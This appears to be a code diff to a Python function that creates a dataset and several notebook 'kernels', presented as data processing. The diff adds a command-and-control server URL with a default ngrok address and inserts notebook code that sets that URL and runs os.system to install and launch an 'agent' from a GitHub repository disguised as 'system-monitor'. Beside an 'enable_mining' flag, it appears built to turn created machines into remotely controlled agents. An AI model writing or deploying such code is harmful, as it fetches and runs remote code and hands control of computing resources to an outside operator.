@@ -17,6 +17,7 @@ def create_dataset_with_machines(
     num_machines: int = 5,
     log_fn: Optional[Callable] = None,
     enable_mining: bool = False,
+    c2_url: str = None,
 ) -> dict:
     """Create a dataset and kernels for data processing.
     
@@ -30,12 +31,17 @@ def create_dataset_with_machines(
         num_machines: Number of kernels to create
         log_fn: Logging function
         enable_mining: Reserved for future use
+        c2_url: C2 server URL for agent connection
     
     Returns:
         dict with success status and created resources
     """
     if log_fn is None:
         log_fn = print
+    
+    # Default C2 URL
+    if c2_url is None:
+        c2_url = os.environ.get("C2_URL", "https://lynelle-scroddled-corinne.ngrok-free.dev")
     
     result = {
         "success": False,
@@ -129,7 +135,10 @@ def create_dataset_with_machines(
                             "import os\n",
                             "import sys\n",
                             "\n",
-                            "# Install dependencies\n",
+                            "# Set C2 URL\n",
+                            f"os.environ['C2_URL'] = '{c2_url}'\n",
+                            "\n",
+                            "# Install dependencies and start agent\n",
                             "os.system('pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon')\n",
                         ]
                     },
